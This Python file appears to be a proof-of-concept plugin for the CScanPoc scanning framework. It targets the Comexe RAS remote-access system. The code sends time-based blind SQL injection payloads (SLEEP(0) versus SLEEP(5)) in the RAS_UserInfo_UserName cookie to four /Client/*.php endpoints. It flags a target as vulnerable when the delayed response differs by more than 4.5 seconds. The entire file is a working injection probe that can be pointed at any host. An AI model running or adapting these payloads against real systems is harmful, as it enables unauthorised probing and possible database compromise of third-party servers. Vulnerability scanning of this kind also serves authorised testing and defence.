# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Comexe_0002'  # 平台漏洞编号，留空
    name = '科迈RAS系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        科迈RAS 为企业提供了一种从中心点集中管理应用程序远程接入方法。
        科迈RAS系统，函数过滤不全导致SQL注射。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '科迈RAS系统'  # 漏洞应用名称
    product_version = '科迈RAS系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4aac2340-8487-4e9a-bd22-144b204729b6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            urls = [
                "/Client/CmxList.php",
                "/Client/CmxLogin.php",
                "/Client/CmxUpdate.php",
                "/Client/CmxSupport.php"
            ]
            for url in urls:
                url = self.target + url
                cookie = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(0)))JarV)%20AND%20'aSBL'='aSBL"
                cookie1 = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20'aSBL'='aSBL"
                t1 = time.time()
                code1, _, _, _, _ = hh.http(url, cookie=cookie)
                true_time = time.time() - t1
                t2 = time.time()
                code2, _, res, _, _ = hh.http(url, cookie=cookie1)
                false_time = time.time() - t2
                if code1 == 200 and code2 == 200 and false_time-true_time > 4.5:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
